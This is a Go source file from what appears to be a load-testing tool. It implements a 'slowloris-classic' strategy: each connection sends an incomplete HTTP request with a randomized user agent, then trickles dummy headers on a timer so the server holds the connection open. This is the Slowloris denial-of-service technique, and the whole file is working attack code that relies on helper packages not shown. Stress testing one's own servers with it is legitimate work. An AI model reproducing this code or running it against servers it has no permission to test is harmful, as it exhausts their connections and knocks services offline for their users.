package strategy

import (
	"context"
	"sync/atomic"
	"time"

	"loadtestforge/internal/httpdata"
	"loadtestforge/internal/netutil"
)

type SlowlorisClassic struct {
	keepAliveInterval time.Duration
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
}

func NewSlowlorisClassic(keepAliveInterval time.Duration, bindIP string) *SlowlorisClassic {
	return &SlowlorisClassic{
		keepAliveInterval: keepAliveInterval,
		connConfig:        netutil.DefaultConnConfig(bindIP),
		headerRandomizer:  httpdata.DefaultHeaderRandomizer(),
	}
}

func (s *SlowlorisClassic) Execute(ctx context.Context, target Target) error {
	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	userAgent := httpdata.RandomUserAgent()

	// Send incomplete HTTP request (no final \r\n to terminate headers)
	incompleteRequest := s.headerRandomizer.BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), 5*time.Second); err != nil {
		return err
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			return nil
		case <-ticker.C:
			dummyHeader := httpdata.GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(dummyHeader), 5*time.Second); err != nil {
				return err
			}
		}
	}
}

func (s *SlowlorisClassic) Name() string {
	return "slowloris-classic"
}

func (s *SlowlorisClassic) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
